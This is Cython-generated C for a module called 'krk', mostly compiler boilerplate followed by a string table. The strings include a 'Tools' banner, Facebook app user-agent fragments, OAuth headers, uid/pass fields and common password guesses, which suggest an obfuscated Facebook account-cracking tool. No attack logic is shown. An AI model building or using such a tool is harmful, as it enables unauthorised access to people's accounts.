static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname);

/* RaiseTooManyValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);

/* RaiseNeedMoreValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);

/* IterFinish.proto */
static CYTHON_INLINE int __Pyx_IterFinish(void);

/* UnpackItemEndCheck.proto */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportDottedModule.proto */
static PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple);
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple);
#endif

/* PyObjectCallNoArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);

/* pep479.proto */
static void __Pyx_Generator_Replace_StopIteration(int in_async_gen);

/* StringJoin.proto */
#if PY_MAJOR_VERSION < 3
#define __Pyx_PyString_Join __Pyx_PyBytes_Join
#define __Pyx_PyBaseString_Join(s, v) (PyUnicode_CheckExact(s) ? PyUnicode_Join(s, v) : __Pyx_PyBytes_Join(s, v))
#else
#define __Pyx_PyString_Join PyUnicode_Join
#define __Pyx_PyBaseString_Join PyUnicode_Join
#endif
#if CYTHON_COMPILING_IN_CPYTHON
    #if PY_MAJOR_VERSION < 3
    #define __Pyx_PyBytes_Join _PyString_Join
    #else
    #define __Pyx_PyBytes_Join _PyBytes_Join
    #endif
#else
static CYTHON_INLINE PyObject* __Pyx_PyBytes_Join(PyObject* sep, PyObject* values);
#endif

/* PySequenceContains.proto */
static CYTHON_INLINE int __Pyx_PySequence_ContainsTF(PyObject* item, PyObject* seq, int eq) {
    int result = PySequence_Contains(seq, item);
    return unlikely(result < 0) ? result : (result == (eq == Py_EQ));
}

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject *const *kwvalues,
    PyObject **argnames[],
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,
    const char* function_name);

/* DictGetItem.proto */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif

/* UnicodeConcatInPlace.proto */
# if CYTHON_COMPILING_IN_CPYTHON && PY_MAJOR_VERSION >= 3
    #if CYTHON_REFNANNY
        #define __Pyx_PyUnicode_ConcatInPlace(left, right) __Pyx_PyUnicode_ConcatInPlaceImpl(&left, right, __pyx_refnanny)
    #else
        #define __Pyx_PyUnicode_ConcatInPlace(left, right) __Pyx_PyUnicode_ConcatInPlaceImpl(&left, right)
    #endif
    static CYTHON_INLINE PyObject *__Pyx_PyUnicode_ConcatInPlaceImpl(PyObject **p_left, PyObject *right
        #if CYTHON_REFNANNY
        , void* __pyx_refnanny
        #endif
    );
#else
#define __Pyx_PyUnicode_ConcatInPlace __Pyx_PyUnicode_Concat
#endif
#define __Pyx_PyUnicode_ConcatInPlaceSafe(left, right) ((unlikely((left) == Py_None) || unlikely((right) == Py_None)) ?\
    PyNumber_InPlaceAdd(left, right) : __Pyx_PyUnicode_ConcatInPlace(left, right))

/* StrConcatInPlace.proto */
#if PY_MAJOR_VERSION >= 3
    #define __Pyx_PyStr_Concat __Pyx_PyUnicode_Concat
    #define __Pyx_PyStr_ConcatInPlace __Pyx_PyUnicode_ConcatInPlace
#else
    #define __Pyx_PyStr_Concat PyNumber_Add
    #define __Pyx_PyStr_ConcatInPlace PyNumber_InPlaceAdd
#endif
#define __Pyx_PyStr_ConcatSafe(a, b) ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
    PyNumber_Add(a, b) : __Pyx_PyStr_Concat(a, b))
#define __Pyx_PyStr_ConcatInPlaceSafe(a, b) ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
    PyNumber_InPlaceAdd(a, b) : __Pyx_PyStr_ConcatInPlace(a, b))

/* IncludeStructmemberH.proto */
#include <structmember.h>

/* FixUpExtensionType.proto */
#if CYTHON_USE_TYPE_SPECS
static int __Pyx_fix_up_extension_type_from_spec(PyType_Spec *spec, PyTypeObject *type);
#endif

/* PyObjectCallMethod0.proto */
static PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name);

/* ValidateBasesTuple.proto */
#if CYTHON_COMPILING_IN_CPYTHON || CYTHON_COMPILING_IN_LIMITED_API || CYTHON_USE_TYPE_SPECS
static int __Pyx_validate_bases_tuple(const char *type_name, Py_ssize_t dictoffset, PyObject *bases);
#endif

/* PyType_Ready.proto */
CYTHON_UNUSED static int __Pyx_PyType_Ready(PyTypeObject *t);

/* PyObject_GenericGetAttrNoDict.proto */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GenericGetAttrNoDict PyObject_GenericGetAttr
#endif

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* FetchSharedCythonModule.proto */
static PyObject *__Pyx_FetchSharedCythonABIModule(void);

/* FetchCommonType.proto */
#if !CYTHON_USE_TYPE_SPECS
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);
#else
static PyTypeObject* __Pyx_FetchCommonTypeFromSpec(PyObject *module, PyType_Spec *spec, PyObject *bases);
#endif

/* PyMethodNew.proto */
#if PY_MAJOR_VERSION >= 3
static PyObject *__Pyx_PyMethod_New(PyObject *func, PyObject *self, PyObject *typ) {
    CYTHON_UNUSED_VAR(typ);
    if (!self)
        return __Pyx_NewRef(func);
    return PyMethod_New(func, self);
}
#else
    #define __Pyx_PyMethod_New PyMethod_New
#endif

/* PyVectorcallFastCallDict.proto */
#if CYTHON_METH_FASTCALL
static CYTHON_INLINE PyObject *__Pyx_PyVectorcall_FastCallDict(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw);
#endif

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CYFUNCTION_COROUTINE     0x08
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#if PY_VERSION_HEX < 0x030900B1
  #define __Pyx_CyFunction_GetClassObj(f)\
      (((__pyx_CyFunctionObject *) (f))->func_classobj)
#else
  #define __Pyx_CyFunction_GetClassObj(f)\
      ((PyObject*) ((PyCMethodObject *) (f))->mm_class)
#endif
#define __Pyx_CyFunction_SetClassObj(f, classobj)\
    __Pyx__CyFunction_SetClassObj((__pyx_CyFunctionObject *) (f), (classobj))
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
#if PY_VERSION_HEX < 0x030900B1
    PyCFunctionObject func;
#else
    PyCMethodObject func;
#endif
#if CYTHON_BACKPORT_VECTORCALL
    __pyx_vectorcallfunc func_vectorcall;
#endif
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
#if PY_VERSION_HEX < 0x030900B1
    PyObject *func_classobj;
#endif
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
    PyObject *func_is_coroutine;
} __pyx_CyFunctionObject;
#define __Pyx_CyFunction_Check(obj)  __Pyx_TypeCheck(obj, __pyx_CyFunctionType)
#define __Pyx_IsCyOrPyCFunction(obj)  __Pyx_TypeCheck2(obj, __pyx_CyFunctionType, &PyCFunction_Type)
#define __Pyx_CyFunction_CheckExact(obj)  __Pyx_IS_TYPE(obj, __pyx_CyFunctionType)
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void __Pyx__CyFunction_SetClassObj(__pyx_CyFunctionObject* f, PyObject* classobj);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(PyObject *module);
#if CYTHON_METH_FASTCALL
static PyObject * __Pyx_CyFunction_Vectorcall_NOARGS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);
static PyObject * __Pyx_CyFunction_Vectorcall_O(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);
static PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);
static PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);
#if CYTHON_BACKPORT_VECTORCALL
#define __Pyx_CyFunction_func_vectorcall(f) (((__pyx_CyFunctionObject*)f)->func_vectorcall)
#else
#define __Pyx_CyFunction_func_vectorcall(f) (((PyCFunctionObject*)f)->vectorcall)
#endif
#endif

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* PyObjectSetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
#define __Pyx_PyObject_DelAttrStr(o,n) __Pyx_PyObject_SetAttrStr(o, n, NULL)
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value);
#else
#define __Pyx_PyObject_DelAttrStr(o,n)   PyObject_DelAttr(o,n)
#define __Pyx_PyObject_SetAttrStr(o,n,v) PyObject_SetAttr(o,n,v)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
#if !CYTHON_COMPILING_IN_LIMITED_API
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);
#endif

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if !defined(__INTEL_COMPILER) && defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* FormatTypeName.proto */
#if CYTHON_COMPILING_IN_LIMITED_API
typedef PyObject *__Pyx_TypeName;
#define __Pyx_FMT_TYPENAME "%U"
static __Pyx_TypeName __Pyx_PyType_GetName(PyTypeObject* tp);
#define __Pyx_DECREF_TypeName(obj) Py_XDECREF(obj)
#else
typedef const char *__Pyx_TypeName;
#define __Pyx_FMT_TYPENAME "%.200s"
#define __Pyx_PyType_GetName(tp) ((tp)->tp_name)
#define __Pyx_DECREF_TypeName(obj)
#endif

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* RaiseException.proto */
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause);

/* SwapException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* CoroutineBase.proto */
struct __pyx_CoroutineObject;
typedef PyObject *(*__pyx_coroutine_body_t)(struct __pyx_CoroutineObject *, PyThreadState *, PyObject *);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_ExcInfoStruct  _PyErr_StackItem
#else
typedef struct {
    PyObject *exc_type;
    PyObject *exc_value;
    PyObject *exc_traceback;
} __Pyx_ExcInfoStruct;
#endif
typedef struct __pyx_CoroutineObject {
    PyObject_HEAD
    __pyx_coroutine_body_t body;
    PyObject *closure;
    __Pyx_ExcInfoStruct gi_exc_state;
    PyObject *gi_weakreflist;
    PyObject *classobj;
    PyObject *yieldfrom;
    PyObject *gi_name;
    PyObject *gi_qualname;
    PyObject *gi_modulename;
    PyObject *gi_code;
    PyObject *gi_frame;
    int resume_label;
    char is_running;
} __pyx_CoroutineObject;
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
    PyTypeObject *type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
    PyObject *name, PyObject *qualname, PyObject *module_name);
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name);
static CYTHON_INLINE void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *self);
static int __Pyx_Coroutine_clear(PyObject *self);
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value);
static PyObject *__Pyx_Coroutine_Close(PyObject *self);
static PyObject *__Pyx_Coroutine_Throw(PyObject *gen, PyObject *args);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_Coroutine_SwapException(self)
#define __Pyx_Coroutine_ResetAndClearException(self)  __Pyx_Coroutine_ExceptionClear(&(self)->gi_exc_state)
#else
#define __Pyx_Coroutine_SwapException(self) {\
    __Pyx_ExceptionSwap(&(self)->gi_exc_state.exc_type, &(self)->gi_exc_state.exc_value, &(self)->gi_exc_state.exc_traceback);\
    __Pyx_Coroutine_ResetFrameBackpointer(&(self)->gi_exc_state);\
    }
#define __Pyx_Coroutine_ResetAndClearException(self) {\
    __Pyx_ExceptionReset((self)->gi_exc_state.exc_type, (self)->gi_exc_state.exc_value, (self)->gi_exc_state.exc_traceback);\
    (self)->gi_exc_state.exc_type = (self)->gi_exc_state.exc_value = (self)->gi_exc_state.exc_traceback = NULL;\
    }
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__pyx_tstate, pvalue)
#else
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, pvalue)
#endif
static int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *tstate, PyObject **pvalue);
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state);

/* PatchModuleWithCoroutine.proto */
static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code);

/* PatchGeneratorABC.proto */
static int __Pyx_patch_abc(void);

/* Generator.proto */
#define __Pyx_Generator_USED
#define __Pyx_Generator_CheckExact(obj) __Pyx_IS_TYPE(obj, __pyx_GeneratorType)
#define __Pyx_Generator_New(body, code, closure, name, qualname, module_name)\
    __Pyx__Coroutine_New(__pyx_GeneratorType, body, code, closure, name, qualname, module_name)
static PyObject *__Pyx_Generator_Next(PyObject *self);
static int __pyx_Generator_init(PyObject *module);

/* CStringEquals.proto */
static CYTHON_INLINE int __Pyx_StrEq(const char *, const char *);

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);

/* #### Code section: module_declarations ### */

/* Module declarations from "krk" */
/* #### Code section: typeinfo ### */
/* #### Code section: before_global_var ### */
#define __Pyx_MODULE_NAME "krk"
extern int __pyx_module_is_main_krk;
int __pyx_module_is_main_krk = 0;

/* Implementation of "krk" */
/* #### Code section: global_var ### */
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_range;
static PyObject *__pyx_builtin_exit;
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_open;
static PyObject *__pyx_builtin_ValueError;
static PyObject *__pyx_builtin_IndexError;
/* #### Code section: string_decls ### */
static const char __pyx_k_0[] = "0";
static const char __pyx_k_1[] = "1";
static const char __pyx_k_2[] = "2";
static const char __pyx_k_3[] = "3";
static const char __pyx_k_4[] = "4";
static const char __pyx_k_5[] = "5";
static const char __pyx_k_6[] = "6";
static const char __pyx_k_7[] = "7";
static const char __pyx_k_8[] = "8";
static const char __pyx_k_9[] = "9";
static const char __pyx_k_A[] = "A";
static const char __pyx_k_B[] = "B";
static const char __pyx_k_C[] = "C";
static const char __pyx_k_D[] = "D";
static const char __pyx_k_E[] = "E";
static const char __pyx_k_F[] = "F";
static const char __pyx_k_G[] = "G";
static const char __pyx_k_H[] = "H";
static const char __pyx_k_I[] = "I";
static const char __pyx_k_J[] = "J";
static const char __pyx_k_K[] = "K";
static const char __pyx_k_L[] = "L";
static const char __pyx_k_M[] = "M";
static const char __pyx_k_N[] = "N";
static const char __pyx_k_O[] = "O";
static const char __pyx_k_P[] = "P";
static const char __pyx_k_Q[] = "Q";
static const char __pyx_k_R[] = "R";
static const char __pyx_k_S[] = "S";
static const char __pyx_k_T[] = "T";
static const char __pyx_k_U[] = "U";
static const char __pyx_k_V[] = "V";
static const char __pyx_k_W[] = "W";
static const char __pyx_k_X[] = "X";
static const char __pyx_k_Y[] = "Y";
static const char __pyx_k_Z[] = "Z";
static const char __pyx_k_a[] = "a";
static const char __pyx_k_b[] = "b";
static const char __pyx_k_c[] = "c";
static const char __pyx_k_d[] = "d";
static const char __pyx_k_e[] = "e";
static const char __pyx_k_f[] = "f";
static const char __pyx_k_g[] = "g";
static const char __pyx_k_h[] = "h";
static const char __pyx_k_i[] = "i";
static const char __pyx_k_j[] = "j";
static const char __pyx_k_k[] = "k";
static const char __pyx_k_l[] = "l";
static const char __pyx_k_n[] = "n";
static const char __pyx_k_r[] = "r";
static const char __pyx_k_x[] = "x";
static const char __pyx_k_y[] = "y";
static const char __pyx_k_00[] = "00";
static const char __pyx_k_01[] = "01";
static const char __pyx_k_02[] = "02";
static const char __pyx_k_03[] = "03";
static const char __pyx_k_04[] = "04";
static const char __pyx_k_05[] = "05";
static const char __pyx_k_06[] = "06";
static const char __pyx_k_08[] = "08";
static const char __pyx_k_10[] = "10";
static const char __pyx_k_11[] = "11";
static const char __pyx_k_12[] = "12";
static const char __pyx_k_13[] = "13";
static const char __pyx_k_28[] = "28";
static const char __pyx_k_29[] = "29";
static const char __pyx_k_aa[] = "aa";
static const char __pyx_k_am[] = "am";
static const char __pyx_k_bd[] = "bd";
static const char __pyx_k_cx[] = "cx";
static const char __pyx_k_fn[] = "fn";
static const char __pyx_k_fo[] = "fo";
static const char __pyx_k_fs[] = "fs";
static const char __pyx_k_gc[] = "gc";
static const char __pyx_k_gt[] = "gt";
static const char __pyx_k_id[] = "id";
static const char __pyx_k_j1[] = "j1";
static const char __pyx_k_li[] = "li";
static const char __pyx_k_ln[] = "ln";
static const char __pyx_k_ls[] = "ls";
static const char __pyx_k_os[] = "os";
static const char __pyx_k_po[] = "po";
static const char __pyx_k_ps[] = "ps";
static const char __pyx_k_pw[] = "pw";
static const char __pyx_k_re[] = "re";
static const char __pyx_k_tl[] = "tl";
static const char __pyx_k_ua[] = "ua";
static const char __pyx_k_wx[] = "wx";
static const char __pyx_k_xd[] = "xd";
static const char __pyx_k_0_0[] = ".0.0.";
static const char __pyx_k_0_1[] = ".0.1; ";
static const char __pyx_k_123[] = "123";
static const char __pyx_k_1_2[] = "?1";
static const char __pyx_k_210[] = "210";
static const char __pyx_k_786[] = "786";
static const char __pyx_k_980[] = "980";
static const char __pyx_k_Key[] = "\n Key :- ";
static const char __pyx_k_Yes[] = "Yes";
static const char __pyx_k__20[] = ": ";
static const char __pyx_k__22[] = " ";
static const char __pyx_k__25[] = "|";
static const char __pyx_k__29[] = "/";
static const char __pyx_k__31[] = "*";
static const char __pyx_k__52[] = "";
static const char __pyx_k__63[] = "\n";
static const char __pyx_k__68[] = " | ";
static const char __pyx_k__72[] = ".";
static const char __pyx_k__75[] = ";]";
static const char __pyx_k__76[] = "[\"";
static const char __pyx_k__77[] = "\"]";
static const char __pyx_k__91[] = "; ";
static const char __pyx_k__92[] = ") ";
static const char __pyx_k_api[] = "api";
static const char __pyx_k_cpl[] = "cpl";
static const char __pyx_k_cps[] = "cps";
static const char __pyx_k_dnt[] = "dnt";
static const char __pyx_k_ffb[] = "ffb";
static const char __pyx_k_get[] = "get";
static const char __pyx_k_ids[] = "ids";
static const char __pyx_k_krk[] = "krk";
static const char __pyx_k_li2[] = "li2";
static const char __pyx_k_lsd[] = "lsd";
static const char __pyx_k_nmp[] = "nmp";
static const char __pyx_k_oks[] = "oks";
static const char __pyx_k_pak[] = "pak";
static const char __pyx_k_pas[] = "pas";
static const char __pyx_k_pcp[] = "pcp";
static const char __pyx_k_pip[] = "pip";
static const char __pyx_k_ppp[] = "ppp";
static const char __pyx_k_ps2[] = "ps2";
static const char __pyx_k_psx[] = "psx";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_tks[] = "tks";
static const char __pyx_k_twf[] = "twf";
static const char __pyx_k_uid[] = "uid";
static const char __pyx_k_url[] = "url";
static const char __pyx_k_yes[] = "yes";
static const char __pyx_k_zea[] = "zea";
static const char __pyx_k_1122[] = "1122";
static const char __pyx_k_1234[] = "1234";
static const char __pyx_k_FB4A[] = "FB4A";
static const char __pyx_k_FBAN[] = ") [FBAN/";
static const char __pyx_k_FBAV[] = ";FBAV/";
static const char __pyx_k_FBBD[] = ";FBBD/";
static const char __pyx_k_FBBV[] = ";FBBV/";
static const char __pyx_k_FBCR[] = ";FBCR/";
static const char __pyx_k_FBDM[] = ";FBDM/";
static const char __pyx_k_FBDV[] = ";FBDV/";
static const char __pyx_k_FBMF[] = ";FBMF/";
static const char __pyx_k_FBPN[] = ";FBPN/";
static const char __pyx_k_FBRV[] = ";FBRV/";
static const char __pyx_k_FBSV[] = ";FBSV/";
static const char __pyx_k_Host[] = "Host";
static const char __pyx_k_Khan[] = "Khan";
static const char __pyx_k_Last[] = "Last";
static const char __pyx_k_Main[] = "Main";
static const char __pyx_k_Name[] = "Name";
static const char __pyx_k__110[] = "?";
static const char __pyx_k_adid[] = "adid";
static const char __pyx_k_api1[] = "api1";
static const char __pyx_k_args[] = "args";
static const char __pyx_k_code[] = "code";
static const char __pyx_k_data[] = "data";
static const char __pyx_k_dump[] = "dump";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_fban[] = "fban";
static const char __pyx_k_fbav[] = "fbav";
static const char __pyx_k_fbbd[] = "fbbd";
static const char __pyx_k_fbbv[] = "fbbv";
static const char __pyx_k_fbca[] = "fbca";
static const char __pyx_k_fbcr[] = "fbcr";
static const char __pyx_k_fbdm[] = "fbdm";
static const char __pyx_k_fbdv[] = "fbdv";
static const char __pyx_k_fbfw[] = "fbfw";
static const char __pyx_k_fbks[] = "fbks";
static const char __pyx_k_fblc[] = "fblc";
static const char __pyx_k_fbmf[] = "fbmf";
static const char __pyx_k_fbpn[] = "fbpn";
static const char __pyx_k_fbrv[] = "fbrv";
static const char __pyx_k_fbsv[] = "fbsv";
static const char __pyx_k_fikr[] = "fikr";
static const char __pyx_k_file[] = "file";
static const char __pyx_k_flow[] = "flow";
static const char __pyx_k_head[] = "head";
static const char __pyx_k_join[] = "join";
static const char __pyx_k_json[] = "json";
static const char __pyx_k_keys[] = "keys";
static const char __pyx_k_last[] = "last";
static const char __pyx_k_logo[] = "logo";
static const char __pyx_k_loop[] = "loop";
static const char __pyx_k_mail[] = "mail";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_menu[] = "menu";
static const char __pyx_k_mthd[] = "mthd";
static const char __pyx_k_name[] = "name";
static const char __pyx_k_next[] = "next";
static const char __pyx_k_nmbr[] = "nmbr";
static const char __pyx_k_none[] = "none";
static const char __pyx_k_open[] = "open";
static const char __pyx_k_pass[] = "pass";
static const char __pyx_k_path[] = "path";
static const char __pyx_k_post[] = "post";
static const char __pyx_k_read[] = "read";
static const char __pyx_k_rndm[] = "rndm";
static const char __pyx_k_send[] = "send";
static const char __pyx_k_spec[] = "__spec__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_text[] = "text";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_tred[] = "tred";
static const char __pyx_k_true[] = "true";
static const char __pyx_k_ugen[] = "ugen";
static const char __pyx_k_user[] = "user";
static const char __pyx_k_uuid[] = "uuid";
static const char __pyx_k_zlib[] = "zlib";
static const char __pyx_k_12345[] = "12345";
static const char __pyx_k_1_32m[] = "\033[1;32m\n$$$$$$$$\\ $$$$$$$$\\  $$$$$$\\  \n\\____$$  |$$  _____|$$  __$$\\ \n    $$  / $$ |      $$ /  $$ |\n   $$  /  $$$$$\\    $$$$$$$$ |\n  $$  /   $$  __|   $$  __$$ |\n $$  /    $$ |      $$ |  $$ |\n$$$$$$$$\\ $$$$$$$$\\ $$ |  $$ |\n\\________|\\________|\\__|  \\__|\n\033[1;32m+==================================================+\n|   Owner        :   Sabir Sahil\n|   Facebook     :   Sabir Sahil\n|   Telegram     :  @Sabir Sahil\n|   Tools        :     FREE\n|   Versino      :     1.6\n+==================================================+";
static const char __pyx_k_1_37m[] = "\033[1;37m----------------------------------------------";
static const char __pyx_k_1_97m[] = "\033[1;97m";
static const char __pyx_k_9_0_1[] = "9.0.1; ";
static const char __pyx_k_Build[] = " Build/";
static const char __pyx_k_First[] = "First";
static const char __pyx_k_GT_81[] = "GT-81";
static const char __pyx_k_Liger[] = "Liger";
static const char __pyx_k_OAuth[] = "OAuth ";
static const char __pyx_k_Sabir[] = "Sabir";
